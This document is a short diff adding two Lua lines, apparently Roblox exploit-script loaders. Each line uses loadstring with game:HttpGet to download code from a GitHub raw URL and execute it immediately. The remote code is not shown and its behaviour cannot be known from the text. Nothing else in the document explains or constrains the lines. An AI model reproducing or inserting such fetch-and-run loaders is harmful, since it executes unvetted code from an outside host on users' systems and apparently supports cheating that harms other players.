@@ -1,0 +1,2 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/1kidskidder/starvast/main/starvastcam",true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/1kidskidder/v4/main/1237",true))()
